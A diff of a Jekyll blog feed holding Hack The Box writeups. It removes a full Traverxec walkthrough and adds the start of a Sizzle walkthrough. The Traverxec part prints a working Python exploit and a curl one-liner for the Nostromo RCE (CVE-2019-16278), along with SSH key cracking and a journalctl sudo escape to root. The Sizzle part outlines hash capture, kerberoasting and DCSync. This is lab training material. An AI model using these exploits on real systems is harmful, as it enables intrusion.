@@ -1,270 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-26T01:39:13+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Traverxec</title><link href="http://localhost:4000/2022/08/25/Traverxec.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Traverxec" /><published>2022-08-25T00:00:00+02:00</published><updated>2022-08-25T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/25/Traverxec</id><content type="html" xml:base="http://localhost:4000/2022/08/25/Traverxec.html"><![CDATA[<p><img src="/assets/Traverxec/Traverxec.png" alt="" /></p>
-
-<h3 id="summary">Summary</h3>
-<ul>
-  <li><strong>Traverxec</strong> is a <strong>Linux</strong> machine hosting a <strong>web server</strong> called <strong>Nostromo</strong> and has <strong>SSH</strong> port open.</li>
-  <li>The <strong>response headers</strong> from the webserver <strong>reveal its version</strong> which happens to be <strong>vulnerable to a Remote Code Execution vulnerability.</strong></li>
-  <li><em>After troubleshooting the exploit and making a few modifications,</em> we get <strong>a shell</strong> as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</li>
-  <li><em>One the box, when going through the files</em> <strong><em>in the webroot,</em></strong> we find <strong>Nostromo’s configuration file.</strong></li>
-  <li>It reveals <strong>an accessible area</strong> within the <code class="language-plaintext highlighter-rouge">david</code> user’s <strong>home directory</strong>. We find a <strong>passphrase-protected private SSH key</strong> there.</li>
-  <li>We manage to <strong>crack it</strong> using <code class="language-plaintext highlighter-rouge">john</code> and are able to <strong>login using SSH.</strong></li>
-  <li><em>In</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s home path</em>, we find a <strong>folder containing a Bash script</strong> that issues a <code class="language-plaintext highlighter-rouge">journalctl</code> command with <code class="language-plaintext highlighter-rouge">sudo</code> <strong>privileges</strong>. We <strong>exploit that to get a shell</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
-</ul>
-
-<hr />
-
-<h3 id="nmap">NMAP</h3>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
-|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
-|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
-80/tcp open  http    nostromo 1.9.6
-|_http-title: TRAVERXEC
-|_http-server-header: nostromo 1.9.6
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></div>
-
-<p><em>from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output,</em> we notice that the web server is <strong>Nostromo version 1.9.6.</strong></p>
-
-<p><em>but before we check for exploits,</em> we’ll first take a look at the website.</p>
-
-<h3 id="the-website">The website</h3>
-<p><img src="/assets/Traverxec/website-home-page.jpg" alt="" /></p>
-
-<p><strong>static content</strong> for the most. Let’s move on :D</p>
-
-<h3 id="searching-and-fixing-exploits">Searching and Fixing Exploits</h3>
-<p>using <code class="language-plaintext highlighter-rouge">searchsploit</code> gets us <strong>two identical matches.</strong></p>
-
-<p><img src="/assets/Traverxec/searchsploit.jpg" alt="" /></p>
-
-<p><em>to go manual,</em> we look at the exploit code:</p>
-
-<p>note: I took away the text art for a more concise view</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
-</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">socket</span>
-<span class="n">help_menu</span> <span class="o">=</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">Usage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;'</span>
-
-<span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">):</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="s">""</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-            <span class="n">connection</span> <span class="o">=</span> <span class="n">soc</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">connection</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-                <span class="k">break</span>
-            <span class="n">response</span> <span class="o">+=</span> <span class="n">connection</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="k">pass</span>
-    <span class="k">return</span> <span class="n">response</span>
-
-<span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
-    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
-    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
-    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>
-
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-        <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
-
-        <span class="n">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
-
-    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">help_menu</span><span class="p">)</span>
-</code></pre></div></div>
-
-<p>seems straightforward. Just a <strong>POST request</strong>. Let’s give it a try:</p>
-
-<p><img src="/assets/Traverxec/exploit-error.jpg" alt="" /></p>
-
-<p>we get a python error. who should worry when we’ve got <strong>Google</strong>? :)</p>
-
-<p>we search to find this answer on <strong>Stack Overflow</strong>:</p>
-
-<p><img src="/assets/Traverxec/stack-overflow-answer.jpg" alt="" /></p>
-
-<p><em>following that,</em> we <strong>modify the code</strong></p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
-    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
-    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
-    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>  <span class="c1"># previously soc.send(payload)
-</span>    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>
-</code></pre></div></div>
-
-<p>then rerun the exploit:</p>
-
-<p><img src="/assets/Traverxec/no-feedback-exploit.jpg" alt="" /></p>
-
-<p><strong>no feedback</strong> at all this time xD</p>
-
-<p><em>But,</em> <strong><em>no feedback doesn’t necessarily mean no effect</em></strong></p>
-
-<p><em>for blind situations like these</em>: it’s good to use something like <code class="language-plaintext highlighter-rouge">wget</code> to <strong>verify code execution.</strong></p>
-
-<p><img src="/assets/Traverxec/code-execution-verified.jpg" alt="" /></p>
-
-<p><strong>we’re good :D</strong> let’s get in with a <strong>reverse shell.</strong></p>
-
-<p><img src="/assets/Traverxec/got-shell.jpg" alt="" /></p>
-
-<p><em>before going any further, since we’re on Linux,</em> it’s nice to <strong>improve our shell</strong>. it’s done in the below steps:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span> <span class="o">||</span> python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
-<span class="c"># Press CTRL + Z</span>
-<span class="nb">stty </span>raw <span class="nt">-echo</span>
-<span class="nb">fg</span>
-<span class="c"># Press Enter twice</span>
-<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash <span class="o">&amp;&amp;</span> <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
-<span class="c"># that's the size that fits my terminal. you can find yours with "stty size"</span>
-<span class="nb">stty </span>rows 51 columns 228
-</code></pre></div></div>
-
-<h3 id="the-nostromo-config-file">The Nostromo config file</h3>
-<p><em>Right after logging in,</em> we go into <code class="language-plaintext highlighter-rouge">/var/nostromo</code>. there was a <strong>configuration file</strong> in the <code class="language-plaintext highlighter-rouge">conf</code> folder.</p>
-
-<p><img src="/assets/Traverxec/nostromo-conf.jpg" alt="" /></p>
-
-<p>A couple of interesting things show up:</p>
-<ul>
-  <li>a username: <code class="language-plaintext highlighter-rouge">david</code></li>
-  <li>an <code class="language-plaintext highlighter-rouge">.htpasswd</code> file</li>
-  <li>and a section on <code class="language-plaintext highlighter-rouge">HOMEDIRS</code></li>
-</ul>
-
-<p><code class="language-plaintext highlighter-rouge">david</code> was a local user on the system</p>
-
-<p><img src="/assets/Traverxec/david-passwd.jpg" alt="" /></p>
-
-<p>the <code class="language-plaintext highlighter-rouge">.htpasswd</code> file contains a hash. we <strong>cracked it</strong> with <code class="language-plaintext highlighter-rouge">john</code> and got a password:</p>
-
-<p><img src="/assets/Traverxec/htpasswd-cracked.jpg" alt="" /></p>
-
-<p>But that password <em>didn’t work</em> for either <code class="language-plaintext highlighter-rouge">root</code> or <code class="language-plaintext highlighter-rouge">david</code>.</p>
-
-<p><img src="/assets/Traverxec/no-cred-reuse-for-htpassword.jpg" alt="" /></p>
-
-<p>we keep it around just in case..</p>
-
-<h3 id="understanding-the-homedirs-feature">Understanding the HOMEDIRS feature</h3>
-<p><em>previously,</em> we attempted to list the contents of <code class="language-plaintext highlighter-rouge">david</code>’s profile but got denied access.</p>
-
-<p><img src="/assets/Traverxec/david-perm-denied.jpg" alt="" /></p>
-
-<p><em>since the</em> <code class="language-plaintext highlighter-rouge">HOMEDIRS</code> <em>feature would give us access into</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s directory,</em> we take <strong>a quick look</strong> at the online <a href="https://www.nazgul.ch/dev/nostromo_man.html">documentation</a> to understand how to use it:</p>
-
-<p>note: <em>to make the page clearer for reading,</em> you may <strong>edit the CSS</strong> for the man page using the <strong>Chrome Dev Tools.</strong></p>
-
-<p><img src="/assets/Traverxec/editing-site-css-for-clarity.jpg" alt="" /></p>
-
-<p>We find that <strong>we can access a user’s folder over HTTP</strong> using the <code class="language-plaintext highlighter-rouge">~</code> followed by the <code class="language-plaintext highlighter-rouge">username</code>.</p>
-
-<p>another thing is: users <strong>can define a certain directory to be shared</strong> through the <code class="language-plaintext highlighter-rouge">homedirs_public</code> option.</p>
-
-<p><img src="/assets/Traverxec/homedirs_explained.jpg" alt="" /></p>
-
-<p>we saw that one in <code class="language-plaintext highlighter-rouge">nhttpd.conf</code></p>
-
-<p><img src="/assets/Traverxec/public_www.jpg" alt="" /></p>
-
-<p>let’s first check the home directory from the outside</p>
-
-<p><img src="/assets/Traverxec/home-dir-website.jpg" alt="" /></p>
-
-<p>there’s nothing in both the web page or the source code.</p>
-
-<p>a <code class="language-plaintext highlighter-rouge">gobuster</code> <strong>brute force</strong> didn’t get us anything new either.</p>
-
-<p><em>Since the</em> <code class="language-plaintext highlighter-rouge">public_www</code> <em>folder</em> <strong>must be</strong> <em>in</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s home directory,</em> we tried to change into it blindly.</p>
-
-<p><img src="/assets/Traverxec/public_www-violated.jpg" alt="" /></p>
-
-<p>And <strong>it worked!</strong> plus we found something that could give us access.</p>
-
-<p>we <strong>copy the archive</strong> to <code class="language-plaintext highlighter-rouge">/tmp</code> where we <strong>extract</strong> it. Inside, we find a <strong>protected</strong> <code class="language-plaintext highlighter-rouge">id_rsa</code> that we need to crack:</p>
-
-<p><img src="/assets/Traverxec/id_rsa_found.jpg" alt="" /></p>
-
-<p>we first <strong>convert</strong> it to a hash using <code class="language-plaintext highlighter-rouge">ssh2john</code> and <strong>crack it</strong> using <code class="language-plaintext highlighter-rouge">john</code> to get a password: “hunter”</p>
-
-<p><img src="/assets/Traverxec/id_rsa_cracked.jpg" alt="" /></p>
-
-<p>we <strong>change the permissions</strong> on the SSH key (<code class="language-plaintext highlighter-rouge">chmod 600 &lt;KEY_FILE&gt;</code>) and use it to access the machine as <code class="language-plaintext highlighter-rouge">david</code></p>
-
-<p><img src="/assets/Traverxec/ssh-as-david.jpg" alt="" /></p>
-
-<h3 id="exploiting-sudo-journalctl-for-privesc">Exploiting SUDO journalctl for Privesc</h3>
-<p><em>Right after logging in,</em> we see <strong>a folder that sticks out</strong>: <code class="language-plaintext highlighter-rouge">bin</code></p>
-
-<p>it had a script <code class="language-plaintext highlighter-rouge">server-status.sh</code> and a file called <code class="language-plaintext highlighter-rouge">server-stats.head</code></p>
-
-<p><img src="/assets/Traverxec/bin-folder-plus-script.jpg" alt="" /></p>
-
-<p>looking at their contents:</p>
-
-<p><img src="/assets/Traverxec/bin-files-breakdown.jpg" alt="" /></p>
-
-<p>the <code class="language-plaintext highlighter-rouge">server-stats.head</code> is just ASCII art</p>
-
-<p>within <code class="language-plaintext highlighter-rouge">server-status.sh</code> are all <strong>commands for checking the status of the Nostromo server</strong> (<em>as we would expect xD</em>)</p>
-
-<p>the <strong>exploitable part</strong> here is the <code class="language-plaintext highlighter-rouge">sudo</code> command:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
-</code></pre></div></div>
-
-<p>that’s because <code class="language-plaintext highlighter-rouge">journalctl</code> <strong><em>can be escaped for a shell with the same privileges</em></strong>.</p>
-
-<p>A quick look on <a href="https://gtfobins.github.io/gtfobins/journalctl/#sudo">GTFOBins</a> can confirm that.</p>
-
-<p><img src="/assets/Traverxec/gtfo-bins-journalctl.jpg" alt="" /></p>
-
-<p>that’s because it “invokes the default pager”. It can be <code class="language-plaintext highlighter-rouge">less</code>, <code class="language-plaintext highlighter-rouge">more</code>, <code class="language-plaintext highlighter-rouge">nano</code> or <code class="language-plaintext highlighter-rouge">vim</code>. which are all escapable :]</p>
-
-<p>Let’s first <strong>run the script</strong> to see <em>if it asks for a password or not.</em></p>
-
-<p><img src="/assets/Traverxec/script-test-run.jpg" alt="" /></p>
-
-<p>It ran <strong><em>without prompting us for authentication.</em></strong></p>
-
-<p>this means that the command <code class="language-plaintext highlighter-rouge">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> is available for <code class="language-plaintext highlighter-rouge">david</code> without him needing to provide a password.</p>
-
-<p>But we won’t get a pager in such a wide terminal:</p>
-
-<p><img src="/assets/Traverxec/no-pager-invoked.jpg" alt="" /></p>
-
-<p><em>But when we make it smaller with</em> <code class="language-plaintext highlighter-rouge">stty</code> ;)</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>rows 20 columns 20
-</code></pre></div></div>
-
-<p><img src="/assets/Traverxec/pager-invoked.jpg" alt="" /></p>
-
-<p>we get a <code class="language-plaintext highlighter-rouge">less</code> pager which we can be turned into a bash shell with <code class="language-plaintext highlighter-rouge">!/bin/bash</code></p>
-
-<p><img src="/assets/Traverxec/rooted.jpg" alt="" /></p>
-
-<p><strong>Owned :D</strong></p>
-
-<h3 id="rewriting-the-nostromo-exploit">Rewriting the Nostromo exploit</h3>
-<p><em>After some brief testing, and</em> <strong><em>for the sake of simplicity,</em></strong> we <strong>re-wrote the the exploit</strong> for Nostromo as a <code class="language-plaintext highlighter-rouge">curl</code> one-liner:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="nt">-H</span> <span class="s1">$'Content-Length: 1'</span> <span class="nt">--data-binary</span> <span class="s1">$'</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0a&lt;COMMAND&gt;'</span> <span class="s1">$'http://&lt;HOSTNAME&gt;:&lt;PORT&gt;/.%0d./.%0d./.%0d./.%0d./bin/sh'</span> <span class="o">&gt;</span>/dev/null
-</code></pre></div></div>
-
-<p><img src="/assets/Traverxec/exploit-rewritten.jpg" alt="" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Insane] - Brainfuck</title><link href="http://localhost:4000/2022/08/17/Brainfuck.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Insane] - Brainfuck" /><published>2022-08-17T00:00:00+02:00</published><updated>2022-08-17T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/17/Brainfuck</id><content type="html" xml:base="http://localhost:4000/2022/08/17/Brainfuck.html"><![CDATA[<p><img src="/assets/Brainfuck/Brainfuck.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-27T02:38:27+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Insane] - Brainfuck</title><link href="http://localhost:4000/2022/08/17/Brainfuck.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Insane] - Brainfuck" /><published>2022-08-17T00:00:00+02:00</published><updated>2022-08-17T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/17/Brainfuck</id><content type="html" xml:base="http://localhost:4000/2022/08/17/Brainfuck.html"><![CDATA[<p><img src="/assets/Brainfuck/Brainfuck.png" alt="" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -3317,4 +3051,378 @@ Host script results:
 
 <p><img src="/assets/Mantis/pykek-for-the-win.jpg" alt="pykek-for-the-win" /></p>
 
-<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle</title><link href="http://localhost:4000/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/02/Sizzle</id><content type="html" xml:base="http://localhost:4000/2022/05/02/Sizzle.html"><![CDATA[<p><img src="/assets/Sizzle/Sizzle.png" alt="Sizzle" /></p>
+
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>A <strong>Windows Domain Controller</strong> machine. We find an <strong>SMB share</strong> containing a <em>writable</em> folder called <code class="language-plaintext highlighter-rouge">Public</code>. We place an <code class="language-plaintext highlighter-rouge">SCF</code> file there that <em>directs the visiting user’s computer</em> to our listening <code class="language-plaintext highlighter-rouge">responder</code> where we capture his <code class="language-plaintext highlighter-rouge">NTLMv2</code> hash.</li>
+  <li><em>After cracking it,</em> we get the password for the <code class="language-plaintext highlighter-rouge">amanda</code> user which we use to enumerate the domain using <code class="language-plaintext highlighter-rouge">BloodHound</code>.</li>
+  <li><em>Noticing that our user has</em> <strong>PowerShell Remoting</strong> <em>capabilities,</em> we try to gain access but are faced with a <em>strange authentication error</em>.</li>
+  <li><em>Upon inspecting the functionality of the</em> <code class="language-plaintext highlighter-rouge">Evil-Winrm</code> <em>tool,</em> we find that we can use a <em>certificate</em> for logging in.</li>
+  <li>We create a <strong>Certificate Signing Request</strong> using <code class="language-plaintext highlighter-rouge">openssl</code> and get it signed from the <strong>ADCS Web Interface</strong> found on the domain controller.</li>
+  <li><em>Using</em> <code class="language-plaintext highlighter-rouge">evil-winrm</code>‘<em>s ability to authenticate using SSL certificates,</em> we successfully achieve code execution.</li>
+  <li>Looking back at the output of <code class="language-plaintext highlighter-rouge">BloodHound</code> showed a <em>kerberoastable</em> user called <code class="language-plaintext highlighter-rouge">mrlky</code> that has dangerous rights abusable for a <code class="language-plaintext highlighter-rouge">DCSync</code> attack.</li>
+  <li>We decide to use <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> to do the job but can’t execute it due to <strong>Applocker</strong> restrictions.</li>
+  <li>We bypass by moving it to the Windows <code class="language-plaintext highlighter-rouge">temp</code> folder and are faced with another error requiring us to authenticate to the network.</li>
+  <li>We add <code class="language-plaintext highlighter-rouge">amanda</code>’s credentials as flags to the <code class="language-plaintext highlighter-rouge">Rubeus</code> tool and manage to kerberoast <code class="language-plaintext highlighter-rouge">mrkly</code>.</li>
+  <li>We crack his <code class="language-plaintext highlighter-rouge">TGS</code> hash and are able to get the password. We then proceed to <code class="language-plaintext highlighter-rouge">DCSync</code> and obtain the <code class="language-plaintext highlighter-rouge">NTLM hash</code> for the <code class="language-plaintext highlighter-rouge">administrator</code> account and <code class="language-plaintext highlighter-rouge">PTH</code> to gain complete access.</li>
+  <li>Bonus: Bypassing <strong>PowerShell Constrained Language Mode</strong>, dodging <strong>Applocker</strong>, <strong>authenticating</strong> to the network and <strong>Kerberoasting</strong> all in a <strong>one-liner</strong> and <em>without touching disk</em>.</li>
+  <li>Joke Section: Pwning the box with <strong>ZeroLogon</strong> XD</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<p>The nmap output gives some good information:</p>
+<ul>
+  <li><strong>Machine Name:</strong> Sizzle</li>
+  <li><strong>Domain Name:</strong> HTB.local</li>
+  <li><strong>FTP</strong> with <em>anonymous</em> login allowed</li>
+  <li><strong>IIS</strong> 10.0 on port 80 which indicates server 2016+ or windows 10</li>
+  <li><strong>SMB</strong> on port 445</li>
+  <li><strong>LDAP</strong> and <strong>GC</strong> on ports 389 and 3268</li>
+  <li><strong>WinRM</strong> on 5985/5986 which is always nice to have</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| tls-alpn: 
+|   h2
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2018-07-02T20:26:23
+|_Not valid after:  2019-07-02T20:26:23
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49688/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-04-30T19:55:42
+|_  start_date: 2022-04-30T19:49:45
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<h3 id="anonymous-ftp">Anonymous FTP</h3>
+<p>No files were there, and we’re not granted <code class="language-plaintext highlighter-rouge">write</code> access either. So we move on.</p>
+
+<p><img src="/assets/Sizzle/Anon-FTP-no-write.jpg" alt="Anon-FTP-no-write" /></p>
+
+<h3 id="httphttps">HTTP/HTTPs</h3>
+<p>The home page just shows a <code class="language-plaintext highlighter-rouge">GIF</code> of bacon sizzling…</p>
+
+<p><img src="/assets/Sizzle/http-homepage.jpg" alt="http-homepage" /></p>
+
